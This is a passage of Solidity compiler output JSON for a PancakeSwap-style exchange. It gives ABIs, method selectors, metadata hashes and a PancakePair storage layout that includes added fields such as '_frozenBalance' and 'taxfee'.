":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/exchange-protocol/contracts/PancakePair.sol\":\"PancakePair\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/exchange-protocol/contracts/PancakeERC20.sol\":{\"keccak256\":\"0x22102f2e61221b4fb36f09c30b2abe3d790a450fa344c78bd7fed2a8d937300a\",\"urls\":[\"bzz-raw://777452abf0aa99434b78ed9d8e4c8d8885190e5a423231f2c84ba804c0759b72\",\"dweb:/ipfs/QmVNe5PF8g4SyaGr4qREDfSohqdq88vZ1FAEjY6xMqHwB4\"]},\"src/exchange-protocol/contracts/PancakePair.sol\":{\"keccak256\":\"0xff962ef737129a532ad97d689ced8a139007b9b9d4152f5fb60fd7714013d30e\",\"urls\":[\"bzz-raw://d8a6488137bd01b9a7aeef0b5517ef2b1441d11d4f709bb288339f89d85b1a53\",\"dweb:/ipfs/QmUV6oq9URRYNDL9mHnFaMLibe9KMYHMPXNo8dHaUAJNXD\"]},\"src/exchange-protocol/contracts/interfaces/IERC20.sol\":{\"keccak256\":\"0x5c2a1626814dfa8c9d73f14358eb349acf411633fdc5dca35fb607dacc7c20dd\",\"urls\":[\"bzz-raw://08b11bb3192bb52d3f341682413419cd516b772c5d9284485e4f846088e640bd\",\"dweb:/ipfs/QmYMcMrR53adeWN75xspymBCFSkWYfAJwtCDfnKaWRuJVy\"]},\"src/exchange-protocol/contracts/interfaces/IPancakeCallee.sol\":{\"keccak256\":\"0xf87708f8fc59352a86cbdc8317a93b46b5d89437418b170cc2778879f8a25fe7\",\"urls\":[\"bzz-raw://71b8ba3e36df11202737c838309b6171e6bf6783796db62c363720f03df0d067\",\"dweb:/ipfs/QmbLpNoZfZrCWqvWCuq6oaeLCnDgqSw6sAH5SGRN2PSwpL\"]},\"src/exchange-protocol/contracts/interfaces/IPancakeERC20.sol\":{\"keccak256\":\"0xcbc23c5f49cec5fe9a629b28641466e09d1decf16b568b874d0a2a54df3e3164\",\"urls\":[\"bzz-raw://2edfcc3d8fca38ab0facf5d1ba062e6e4c23fc2c2390078ef8ccb5290495fdab\",\"dweb:/ipfs/QmZmTT6nVVSvesy6oY8pwHKvuY5W1EZr5jGeBmK73Rvrzg\"]},\"src/exchange-protocol/contracts/interfaces/IPancakeFactory.sol\":{\"keccak256\":\"0xea125e6c4e3c52bce633dc5667b1e108c63ef48866943eb6c4074f19b23ed7c5\",\"urls\":[\"bzz-raw://c875e62eaaeab86a84108aa360d1dab9e9b4c9dd06299595bfb512c4259b1050\",\"dweb:/ipfs/QmW88oRqeybnNXsLM4P6cfTfYPdpEUR3742rYkPY2zmFv2\"]},\"src/exchange-protocol/contracts/interfaces/IPancakePair.sol\":{\"keccak256\":\"0xe4daee16aaf3d76aa213eb0133d5b72e4a2eb432d7751c14067192acb106a859\",\"urls\":[\"bzz-raw://e6cb03aa3a86cfc8951ba9b3fd61f7fdb5fd99e683f3784612c7cacae39f09e4\",\"dweb:/ipfs/QmPsrw6fZZ8kRWb8XsWBGoCp5DHLCmcQf6epbobyr1A9TZ\"]},\"src/exchange-protocol/contracts/libraries/Math.sol\":{\"keccak256\":\"0x9e94097dd206ec6121005eb1e67e8347a2cfca90fb7d0b599522ce2f8a36c09b\",\"urls\":[\"bzz-raw://bfa9f239f212c94f413dc5ef4f5cabc853e789519bd9610a51fd7a2ea222d8fb\",\"dweb:/ipfs/QmR1YCU8VQ28BnqeRQ9WqSwqjxLzmtJYz2KqW2XQKjP9dR\"]},\"src/exchange-protocol/contracts/libraries/SafeMath.sol\":{\"keccak256\":\"0xd0cc5ede4252f34f9adf75af689fb003aa6349f229b9bba72db43cba9bb1c9d9\",\"urls\":[\"bzz-raw://a2cb594533aebe5028b93c5c429b23907a4830964d8c6728565992bee4cf1eef\",\"dweb:/ipfs/QmdSBCeJiqjQeGZ2K79DXaDfaqJMtXCWAyXDWJ3KNDWZKM\"]},\"src/exchange-protocol/contracts/libraries/UQ112x112.sol\":{\"keccak256\":\"0x0cd289c012b341feda98ad4cc732ee5ce64cd5d0b106796e4c8edcdad1c2e43b\",\"urls\":[\"bzz-raw://098881b3c407c56d0e9a707f6d6bc5ced2ae78dfe58aa82055c754ee2dd4c97a\",\"dweb:/ipfs/QmQEU9ynXqGR14fYyLgQbdxYebxQsCHsgwE2hr7xAeLzCC\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 19,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "totalSupply",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 23,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "balanceOf",
								"offset": 0,
								"slot": "1",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 29,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "allowance",
								"offset": 0,
								"slot": "2",
								"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
							},
							{
								"astId": 33,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "_frozenBalance",
								"offset": 0,
								"slot": "3",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 35,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "DOMAIN_SEPARATOR",
								"offset": 0,
								"slot": "4",
								"type": "t_bytes32"
							},
							{
								"astId": 42,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "nonces",
								"offset": 0,
								"slot": "5",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 457,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "FeeResiver",
								"offset": 0,
								"slot": "6",
								"type": "t_address"
							},
							{
								"astId": 473,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "factory",
								"offset": 0,
								"slot": "7",
								"type": "t_address"
							},
							{
								"astId": 475,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "token0",
								"offset": 0,
								"slot": "8",
								"type": "t_address"
							},
							{
								"astId": 477,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "token1",
								"offset": 0,
								"slot": "9",
								"type": "t_address"
							},
							{
								"astId": 479,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "taxfee",
								"offset": 0,
								"slot": "10",
								"type": "t_uint256"
							},
							{
								"astId": 481,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "reserve0",
								"offset": 0,
								"slot": "11",
								"type": "t_uint112"
							},
							{
								"astId": 483,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "reserve1",
								"offset": 14,
								"slot": "11",
								"type": "t_uint112"
							},
							{
								"astId": 485,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "blockTimestampLast",
								"offset": 28,
								"slot": "11",
								"type": "t_uint32"
							},
							{
								"astId": 487,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "price0CumulativeLast",
								"offset": 0,
								"slot": "12",
								"type": "t_uint256"
							},
							{
								"astId": 489,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "price1CumulativeLast",
								"offset": 0,
								"slot": "13",
								"type": "t_uint256"
							},
							{
								"astId": 491,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "kLast",
								"offset": 0,
								"slot": "14",
								"type": "t_uint256"
							},
							{
								"astId": 494,
								"contract": "src/exchange-protocol/contracts/PancakePair.sol:PancakePair",
								"label": "unlocked",
								"offset": 0,
								"slot": "15",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_bytes32": {
								"encoding": "inplace",
								"label": "bytes32",
								"numberOfBytes": "32"
							},
							"t_mapping(t_address,t_mapping(t_address,t_uint256))": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => mapping(address => uint256))",
								"numberOfBytes": "32",
								"value": "t_mapping(t_address,t_uint256)"
							},
							"t_mapping(t_address,t_uint256)": {
								"encoding": "mapping",
								"key": "t_address",
								"label": "mapping(address => uint256)",
								"numberOfBytes": "32",
								"value": "t_uint256"
							},
							"t_uint112": {
								"encoding": "inplace",
								"label": "uint112",
								"numberOfBytes": "14"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							},
							"t_uint32": {
								"encoding": "inplace",
								"label": "uint32",
								"numberOfBytes": "4"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/exchange-protocol/contracts/interfaces/IERC20.sol": {
				"IERC20": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"decimals()": "313ce567",
							"name()": "06fdde03",
							"symbol()": "95d89b41",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/exchange-protocol/contracts/interfaces/IERC20.sol\":\"IERC20\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/exchange-protocol/contracts/interfaces/IERC20.sol\":{\"keccak256\":\"0x5c2a1626814dfa8c9d73f14358eb349acf411633fdc5dca35fb607dacc7c20dd\",\"urls\":[\"bzz-raw://08b11bb3192bb52d3f341682413419cd516b772c5d9284485e4f846088e640bd\",\"dweb:/ipfs/QmYMcMrR53adeWN75xspymBCFSkWYfAJwtCDfnKaWRuJVy\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/exchange-protocol/contracts/interfaces/IPancakeCallee.sol": {
				"IPancakeCallee": {
					"abi": [
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "pancakeCall",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"pancakeCall(address,uint256,uint256,bytes)": "84800812"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"pancakeCall\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/exchange-protocol/contracts/interfaces/IPancakeCallee.sol\":\"IPancakeCallee\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/exchange-protocol/contracts/interfaces/IPancakeCallee.sol\":{\"keccak256\":\"0xf87708f8fc59352a86cbdc8317a93b46b5d89437418b170cc2778879f8a25fe7\",\"urls\":[\"bzz-raw://71b8ba3e36df11202737c838309b6171e6bf6783796db62c363720f03df0d067\",\"dweb:/ipfs/QmbLpNoZfZrCWqvWCuq6oaeLCnDgqSw6sAH5SGRN2PSwpL\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/exchange-protocol/contracts/interfaces/IPancakeERC20.sol": {
				"IPancakeERC20": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "DOMAIN_SEPARATOR",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "PERMIT_TYPEHASH",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								}
							],
							"name": "nonces",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "deadline",
									"type": "uint256"
								},
								{
									"internalType": "uint8",
									"name": "v",
									"type": "uint8"
								},
								{
									"internalType": "bytes32",
									"name": "r",
									"type": "bytes32"
								},
								{
									"internalType": "bytes32",
									"name": "s",
									"type": "bytes32"
								}
							],
							"name": "permit",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"DOMAIN_SEPARATOR()": "3644e515",
							"PERMIT_TYPEHASH()": "30adf81f",
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"decimals()": "313ce567",
							"name()": "06fdde03",
							"nonces(address)": "7ecebe00",
							"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "d505accf",
							"symbol()": "95d89b41",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PERMIT_TYPEHASH\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{